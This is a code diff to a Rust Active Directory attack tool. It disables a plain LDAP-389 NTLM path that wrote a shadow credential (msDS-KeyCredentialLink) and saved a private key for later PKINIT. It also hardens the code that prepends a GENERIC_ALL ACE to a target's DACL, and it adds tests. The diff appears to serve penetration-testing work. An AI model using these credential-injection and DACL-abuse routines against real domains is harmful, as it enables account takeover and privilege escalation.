@@ -101,16 +101,16 @@ pub(crate) struct AbuseArgs {
     /// the key .pem path — defaults to `<target>.key.pem`
     #[arg(long, default_value = "")]
     pub value: String,
-    /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
+    /// Kerberos realm (pkinit).
     #[arg(long)]
     pub realm: Option<String>,
     /// KDC `host[:port]` (pkinit)
     #[arg(long)]
     pub kdc: Option<String>,
-    /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
+    /// Legacy unsafe direct LDAP-389 authentication switch. Rejected; use verified LDAPS.
     #[arg(long)]
     pub ldap389: bool,
-    /// DC host for --ldap389
+    /// Legacy host argument retained for CLI compatibility with the rejected --ldap389 mode.
     #[arg(long)]
     pub host: Option<String>,
     /// Show what the write would send (SD hex, LDAP modify record) without executing it.
@@ -158,50 +158,13 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
         return Ok(());
     }
 
-    // add-keycred over raw LDAP-389 + NTLM SASL (no LDAPS) — also the relay code path.
+    // A direct credentialed LDAP-389 write has no integrity until this client implements the
+    // negotiated SASL security layer. Keep relay mode separate: a relay never has the victim's
+    // exported session key and is intentionally evaluated by the target DC's signing policy.
     if a.ldap389 {
-        let host = a.host.clone().context("--ldap389 needs --host")?;
-        let realm = a.realm.clone().context("--ldap389 needs --realm")?;
-        let user = a.auth.user.clone().context("--ldap389 needs --user")?;
-        let password = a
-            .auth
-            .password
-            .clone()
-            .context("--ldap389 needs --password")?;
-        let bare = user
-            .split('@')
-            .next()
-            .unwrap_or(&user)
-            .rsplit('\\')
-            .next()
-            .unwrap_or(&user)
-            .to_string();
-        let base: String = realm
-            .split('.')
-            .map(|p| format!("DC={p}"))
-            .collect::<Vec<_>>()
-            .join(",");
-        let mut ld = adhammer_ldap::LdapClient::connect(&format!("{host}:389")).await?;
-        ld.bind_ntlm(&realm, &bare, &password, "ADHAMMER").await?;
-        let dn = ld.find_dn(&base, &a.target).await?;
-        let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
-        if a.dry_run {
-            println!(
-                "[dry-run] would write attribute=msDS-KeyCredentialLink target={dn} value={} (dn-binary)",
-                kc.dn_binary
-            );
-            println!("[dry-run] no change made");
-            return Ok(());
-        }
-        ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
-            .await?;
-        std::fs::write(format!("{}.key.pem", a.target), &kc.private_key_pem)?;
-        println!("[+] LDAP-389 (NTLM SASL) add-keycred on {dn}");
-        println!(
-            "    key saved to {}.key.pem — Phase 2: attack abuse --action pkinit --target {}",
-            a.target, a.target
+        anyhow::bail!(
+            "--ldap389 direct authentication is disabled because post-bind integrity is not implemented; use --url ldaps://<dc>:636 with certificate verification"
         );
-        return Ok(());
     }
 
     let cfg = LdapConfig {
@@ -522,13 +485,22 @@ const SD_HEADER_LEN: usize = 20;
 
 /// Length of the SID starting at `b[off]` — 8 header bytes + 4 per sub-authority.
 fn sid_len_at(b: &[u8], off: usize) -> Option<usize> {
-    let count = *b.get(off + 1)? as usize;
-    Some(8 + count * 4)
+    if off == 0 {
+        return Some(0);
+    }
+    let count_pos = off.checked_add(1)?;
+    let count = *b.get(count_pos)? as usize;
+    8usize.checked_add(count.checked_mul(4)?)
 }
 
 /// Length of the ACL at `b[off]` — its own AclSize field (offset+2, u16 LE).
 fn acl_len_at(b: &[u8], off: usize) -> Option<usize> {
-    Some(u16::from_le_bytes([*b.get(off + 2)?, *b.get(off + 3)?]) as usize)
+    if off == 0 {
+        return Some(0);
+    }
+    let size_pos = off.checked_add(2)?;
+    let size = u16::from_le_bytes([*b.get(size_pos)?, *b.get(size_pos.checked_add(1)?)?]) as usize;
+    (size >= 8).then_some(size)
 }
 
 fn read_u32_le(b: &[u8], off: usize) -> Option<u32> {
@@ -560,6 +532,9 @@ fn parse_sd_sections(b: &[u8]) -> Option<SdParts> {
     }
     let revision = b[0];
     let control = u16::from_le_bytes([b[2], b[3]]);
+    if control & 0x8000 == 0 {
+        return None;
+    }
     let owner_off = read_u32_le(b, 4)? as usize;
     let group_off = read_u32_le(b, 8)? as usize;
     let sacl_off = read_u32_le(b, 12)? as usize;
@@ -570,7 +545,8 @@ fn parse_sd_sections(b: &[u8]) -> Option<SdParts> {
             Some(Vec::new())
         } else {
             let l = len?;
-            Some(b.get(off..off + l)?.to_vec())
+            let end = off.checked_add(l)?;
+            Some(b.get(off..end)?.to_vec())
         }
     };
     Some(SdParts {
@@ -660,15 +636,46 @@ pub(crate) fn swap_owner_in_sd(sd: &[u8], new_owner_sid: &[u8]) -> Option<Vec<u8
 
 /// Build an ACCESS_ALLOWED_ACE (type 0x00) granting GENERIC_ALL (0x1000_0000) to `trustee_sid`.
 /// Layout: Type(1) Flags(1) Size(2) Mask(4) SID(variable). Size = 8 + SID length.
-fn build_generic_all_ace(trustee_sid: &[u8]) -> Vec<u8> {
-    let mut ace = Vec::with_capacity(8 + trustee_sid.len());
+fn build_generic_all_ace(trustee_sid: &[u8]) -> Option<Vec<u8>> {
+    let total = 8usize.checked_add(trustee_sid.len())?;
+    let size = u16::try_from(total).ok()?;
+    let mut ace = Vec::with_capacity(total);
     ace.push(0x00); // ACCESS_ALLOWED_ACE_TYPE
     ace.push(0x00); // AceFlags — non-inheritable
-    let size = (8 + trustee_sid.len()) as u16;
     ace.extend_from_slice(&size.to_le_bytes());
     ace.extend_from_slice(&0x1000_0000u32.to_le_bytes()); // GENERIC_ALL
     ace.extend_from_slice(trustee_sid);
-    ace
+    Some(ace)
+}
+
+fn validate_acl_bytes(acl: &[u8]) -> Option<(u16, &[u8])> {
+    if acl.len() < 8 {
+        return None;
+    }
+    let declared_size = u16::from_le_bytes([acl[2], acl[3]]) as usize;
+    if declared_size != acl.len() {
+        return None;
+    }
+    let count = u16::from_le_bytes([acl[4], acl[5]]);
+    let mut cur = 8usize;
+    for _ in 0..count {
+        let header_end = cur.checked_add(4)?;
+        if header_end > declared_size {
+            return None;
+        }
+        let ace_size = u16::from_le_bytes([acl[cur + 2], acl[cur + 3]]) as usize;
+        if ace_size < 4 {
+            return None;
+        }
+        cur = cur.checked_add(ace_size)?;
+        if cur > declared_size {
+            return None;
+        }
+    }
+    if cur != declared_size {
+        return None;
+    }
+    Some((count, &acl[8..]))
 }
 
 /// Prepend an ACCESS_ALLOWED_ACE granting GENERIC_ALL to `new_trustee_sid` at DACL
@@ -677,14 +684,15 @@ fn build_generic_all_ace(trustee_sid: &[u8]) -> Vec<u8> {
 /// single-ACE DACL is synthesised.
 pub(crate) fn prepend_generic_all_ace(sd: &[u8], new_trustee_sid: &[u8]) -> Option<Vec<u8>> {
     let mut p = parse_sd_sections(sd)?;
-    let ace = build_generic_all_ace(new_trustee_sid);
+    let ace = build_generic_all_ace(new_trustee_sid)?;
 
     let new_dacl = if p.dacl.is_empty() {
         // Synthesize: revision 2, size = 8 + ace.len(), count 1.
-        let mut d = Vec::with_capacity(8 + ace.len());
+        let new_len = 8usize.checked_add(ace.len())?;
+        let mut d = Vec::with_capacity(new_len);
         d.push(0x02); // AclRevision (2 for non-object ACEs)
         d.push(0x00);
-        let dacl_size = (8 + ace.len()) as u16;
+        let dacl_size = u16::try_from(new_len).ok()?;
         d.extend_from_slice(&dacl_size.to_le_bytes());
         d.extend_from_slice(&1u16.to_le_bytes()); // AceCount
         d.extend_from_slice(&0u16.to_le_bytes()); // Sbz2
@@ -694,13 +702,14 @@ pub(crate) fn prepend_generic_all_ace(sd: &[u8], new_trustee_sid: &[u8]) -> Opti
         d
     } else {
         // Read existing header, splice new ACE in front of existing ACEs.
-        let existing_size = u16::from_le_bytes([p.dacl[2], p.dacl[3]]) as usize;
-        let existing_count = u16::from_le_bytes([p.dacl[4], p.dacl[5]]);
-        let existing_ace_bytes = &p.dacl[8..existing_size];
-        let mut d = Vec::with_capacity(8 + ace.len() + existing_ace_bytes.len());
+        let (existing_count, existing_ace_bytes) = validate_acl_bytes(&p.dacl)?;
+        let new_len = 8usize
+            .checked_add(ace.len())?
+            .checked_add(existing_ace_bytes.len())?;
+        let new_size = u16::try_from(new_len).ok()?;
+        let mut d = Vec::with_capacity(new_len);
         d.push(p.dacl[0]); // preserve AclRevision (may be 4 for object ACEs)
         d.push(p.dacl[1]);
-        let new_size = (8 + ace.len() + existing_ace_bytes.len()) as u16;
         d.extend_from_slice(&new_size.to_le_bytes());
         let new_count = existing_count.checked_add(1)?;
         d.extend_from_slice(&new_count.to_le_bytes());
@@ -769,7 +778,7 @@ mod tests {
 
     #[test]
     fn generic_all_ace_layout() {
-        let ace = build_generic_all_ace(&user_sid());
+        let ace = build_generic_all_ace(&user_sid()).expect("valid SID-sized ACE");
         // Header: type 0x00, flags 0x00, size = 8 + sid_len.
         assert_eq!(ace[0], 0x00);
         assert_eq!(ace[1], 0x00);
@@ -805,7 +814,7 @@ mod tests {
     #[test]
     fn prepend_ace_on_empty_dacl_synthesizes_one() {
         // Minimal self-relative SD with no owner/group/sacl/dacl (all offsets zero).
-        let mut sd = vec![1u8, 0, 0, 0]; // rev=1, sbz1=0, control=0
+        let mut sd = vec![1u8, 0, 0, 0x80]; // rev=1, sbz1=0, SE_SELF_RELATIVE
         sd.extend_from_slice(&0u32.to_le_bytes());
         sd.extend_from_slice(&0u32.to_le_bytes());
         sd.extend_from_slice(&0u32.to_le_bytes());
@@ -818,6 +827,17 @@ mod tests {
         let aces = parsed.dacl.unwrap().aces;
         assert_eq!(aces.len(), 1);
         assert_eq!(aces[0].trustee.sub_authorities, vec![21, 1, 2, 3, 1104]);
+    }
+
+    #[test]
+    fn prepend_ace_rejects_short_declared_acl() {
+        let mut sd = vec![1u8, 0, 0x04, 0x80];
+        sd.extend_from_slice(&0u32.to_le_bytes());
+        sd.extend_from_slice(&0u32.to_le_bytes());
+        sd.extend_from_slice(&0u32.to_le_bytes());
+        sd.extend_from_slice(&20u32.to_le_bytes());
+        sd.extend_from_slice(&[2, 0, 6, 0, 0, 0]);
+        assert!(prepend_generic_all_ace(&sd, &user_sid()).is_none());
     }
 
     #[test]
